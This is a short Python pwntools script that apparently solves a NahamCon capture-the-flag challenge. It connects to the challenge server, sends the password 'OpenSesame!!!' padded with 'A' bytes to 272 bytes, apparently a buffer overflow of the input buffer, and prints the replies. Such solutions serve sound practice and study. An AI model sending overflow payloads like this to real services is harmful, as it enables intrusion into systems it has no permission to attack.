from pwn import *

passwd = b'OpenSesame!!!'
conn = remote('challenge.nahamcon.com',30239)
conn.recvuntil(b'the cave?')
conn.send(passwd+b'A'*(272-len(passwd))+b'\n')
res = conn.recvline()
print(res)
res = conn.recvline()
print(res)
res = conn.recvline()
print(res)
